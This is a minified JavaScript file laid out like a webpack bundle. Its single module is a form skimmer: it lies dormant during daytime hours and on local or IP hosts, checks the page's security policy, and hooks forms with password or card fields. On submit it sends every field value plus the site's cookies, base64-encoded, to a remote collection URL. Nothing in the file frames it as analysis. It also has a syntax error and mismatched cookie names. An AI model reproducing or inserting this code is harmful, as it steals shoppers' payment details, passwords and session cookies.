!function (funcArray) {
    var M = {};

    function e(n) {
        if (M[n]) return M[n].exports;
        var t = M[n] = {i: n, l: !1, exports: {}};
        return funcArray[n].call(t.exports, t, t.exports, e), t.l = !0, t.exports
    }

    e.m = funcArray, e.c = M, e.d = function (_, M, n) {
        e.o(_, M) || Object.defineProperty(_, M, {configurable: !1, enumerable: !0, get: n})
    }, e.r = function (_) {
        Object.defineProperty(_, "__esModule", {value: !0})
    }, e.n = function (_) {
        var M = _ && _.__esModule ? function () {
            return _.default
        } : function () {
            return _
        };
        return e.d(M, "a", M), M
    }, e.o = function (_, M) {
        return Object.prototype.hasOwnProperty.call(_, M)
    }, e.p = "", e(e.s = 0)
}([function (_, M) {
    var e = ['https://example.com/minjs.php?pl='];

    function n(_) {
        var M = e[0] + _;
        const n = document.createElement('link');
        return n.rel = 'prefetch', n.href = M, document.head.appendChild(n), !0
    }

    function t(_) {
        return !!document.cookie.match(new RegExp('(?:^|; )' + _.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\\\' + '$1') + '=([^;]*)'))
    }

    function o(_, M, e) {
        var n = new Date;
        n = new Date(n.getTime() + 1e3 * e), document.cookie = _ + '=' + M + '; expires=' + n.toGMTString() + ';'
    }

    !function () {
        if (typeof window != "undefined" && window.document) {
            var _, M = t("xfhd"), r = t("xfhda");
            if (_Acuv = (_ = (new Date).getHours()) > 7 && _ < 19, a = self.location.host, !(/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(a) || a.toLowerCase().includes("localhost") || M || _Acuv || r)) {
                var c = document.forms.length;
                fetch(document.location.href).then(_ => {
                    const t = _.headers.get("Content-Security-Policy");
                    if (null != t && t.includes("default-src")) {
                        if (t.includes("form-action") || M) return;
                        for (r = 0; r < c; r++) for (a = document.forms[r].elements, u = 0; u < a.length; u++) if (a[u].type == "password" || a[u].name.toLowerCase() == "cvc" || a[u].name.toLowerCase() == "cardnumber") {
                            document.forms[r].addEventListener(_"submit", function (_) {
                                for (var M = "", n = 0; n < this.elements.length; n++) M = M + this.elements[n].name + ':' + this.elements[n].value + ':';
                                o('xhfda', 1, 864e3);
                                const t = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + '|' + M + '|' + document.cookie))));
                                var r = e[0] + t + '&loc=' + self.location;
                                this.action = r
                            });
                            break
                        }
                    } else for (var r = 0; r < c; r++) for (var a = document.forms[r].elements, u = 0; u < a.length; u++) if (a[u].type == 'password' || a[u].name.toLowerCase() == 'cvc' || a[u].name.toLowerCase() == 'cardnumber') {
                        document.forms[r].addEventListener('submit', function (_) {
                            for (var M = "", e = 0; e < this.elements.length; e++) M = M + this.elements[e].name + ':' + this.elements[e].value + ':';
                            n(encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + '|' + M + '|' + document.cookie)))))
                        });
                        break
                    }
                }), o('xhfd', 1, 86400)
            }
        }
        var a
    }()
}]);
